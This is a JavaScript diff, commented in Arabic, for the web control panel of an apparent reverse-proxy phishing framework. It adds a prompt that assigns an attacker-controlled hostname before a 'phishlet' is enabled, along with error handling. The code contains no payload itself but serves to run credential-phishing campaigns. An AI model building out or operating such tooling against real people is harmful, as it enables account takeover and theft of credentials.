@@ -239,6 +239,61 @@ async function togglePhishlet(name, enable) {
     try {
         console.log(`محاولة ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet: ${name}`);
         
+        // إذا كنا نحاول تفعيل، نتحقق أولاً مما إذا كان له hostname مضبوط
+        if (enable) {
+            // الحصول على معلومات الـ phishlet
+            const phishletResponse = await fetch(`${API_BASE_URL}/phishlets/${name}`, {
+                method: 'GET',
+                headers: getHeaders()
+            });
+            
+            if (!phishletResponse.ok) {
+                throw new Error(`فشل في الحصول على معلومات الـ Phishlet: ${phishletResponse.statusText}`);
+            }
+            
+            const phishletData = await phishletResponse.json();
+            console.log(`بيانات الـ Phishlet ${name}:`, phishletData);
+            
+            // التحقق مما إذا كان الـ phishlet يحتاج إلى hostname
+            if (!phishletData.data.hostname || phishletData.data.hostname === "") {
+                // إظهار مربع حوار لطلب hostname
+                const hostname = await showHostnamePrompt(name);
+                if (!hostname) {
+                    // المستخدم ألغى العملية
+                    return false;
+                }
+                
+                // تحديث hostname للـ phishlet
+                const hostnameResponse = await fetch(`${API_BASE_URL}/configs/hostname`, {
+                    method: 'POST',
+                    headers: getHeaders(),
+                    body: JSON.stringify({
+                        phishlet: name,
+                        hostname: hostname
+                    })
+                });
+                
+                if (!hostnameResponse.ok) {
+                    const errorText = await hostnameResponse.text();
+                    let errorMessage = hostnameResponse.statusText;
+                    
+                    try {
+                        const errorData = JSON.parse(errorText);
+                        if (errorData.message) {
+                            errorMessage = errorData.message;
+                        }
+                    } catch (e) {
+                        console.error("خطأ في تحليل استجابة الخطأ:", e);
+                    }
+                    
+                    throw new Error(`فشل في تعيين hostname: ${errorMessage}`);
+                }
+                
+                console.log(`تم تعيين hostname بنجاح للـ phishlet ${name}`);
+            }
+        }
+        
+        // الآن نقوم بتفعيل/تعطيل الـ phishlet
         const action = enable ? 'enable' : 'disable';
         const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
             method: 'POST',
@@ -247,6 +302,22 @@ async function togglePhishlet(name, enable) {
         
         // تسجيل الاستجابة كاملة للتصحيح
         console.log(`استجابة ${action} للـ phishlet:`, response);
+        
+        if (!response.ok) {
+            const errorText = await response.text();
+            let errorMessage = response.statusText;
+            
+            try {
+                const errorData = JSON.parse(errorText);
+                if (errorData.message) {
+                    errorMessage = errorData.message;
+                }
+            } catch (e) {
+                console.error("خطأ في تحليل استجابة الخطأ:", e);
+            }
+            
+            throw new Error(`فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ phishlet: ${errorMessage}`);
+        }
         
         const data = await response.json();
         console.log(`بيانات استجابة ${action} للـ phishlet:`, data);
@@ -269,11 +340,77 @@ async function togglePhishlet(name, enable) {
     }
 }
 
+// عرض مربع حوار لطلب hostname
+async function showHostnamePrompt(phishletName) {
+    return new Promise((resolve) => {
+        // إنشاء العناصر
+        const modal = document.createElement('div');
+        modal.className = 'modal active';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>تعيين Hostname للـ Phishlet</h3>
+                    <button class="modal-close">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <p>يجب إدخال hostname لتفعيل الـ phishlet "${phishletName}"</p>
+                    <div class="form-group">
+                        <label for="hostname-input">Hostname</label>
+                        <input type="text" id="hostname-input" class="form-control" placeholder="example.yourdomain.com">
+                        <small class="form-text">
+                            أدخل النطاق الفرعي الذي سيستخدم للـ phishlet. 
+                            تأكد من أن هذا النطاق يشير إلى خادمك.
+                        </small>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary cancel-btn">إلغاء</button>
+                    <button class="btn btn-primary save-btn">حفظ</button>
+                </div>
+            </div>
+        `;
+        document.body.appendChild(modal);
+        
+        // التركيز على حقل الإدخال
+        const input = modal.querySelector('#hostname-input');
+        setTimeout(() => input.focus(), 100);
+        
+        // إضافة معالجات الأحداث
+        const closeBtn = modal.querySelector('.modal-close');
+        const cancelBtn = modal.querySelector('.cancel-btn');
+        const saveBtn = modal.querySelector('.save-btn');
+        
+        const close = (result) => {
+            document.body.removeChild(modal);
+            resolve(result);
+        };
+        
+        closeBtn.addEventListener('click', () => close(null));
+        cancelBtn.addEventListener('click', () => close(null));
+        
+        saveBtn.addEventListener('click', () => {
+            const hostname = input.value.trim();
+            if (!hostname) {
+                showToast('خطأ', 'يرجى إدخال hostname صالح', 'error');
+                return;
+            }
+            close(hostname);
+        });
+        
+        // معالجة ضغط Enter في حقل الإدخال
+        input.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                saveBtn.click();
+            }
+        });
+    });
+}
+
 // التحقق مما إذا كانت التغييرات قد تم حفظها
 async function checkConfigSaved() {
     try {
         // طلب لحفظ التكوين
-        const response = await fetch('/api/config/save', {
+        const response = await fetch(`${API_BASE_URL}/config/save`, {
             method: 'POST',
             headers: getHeaders()
         });
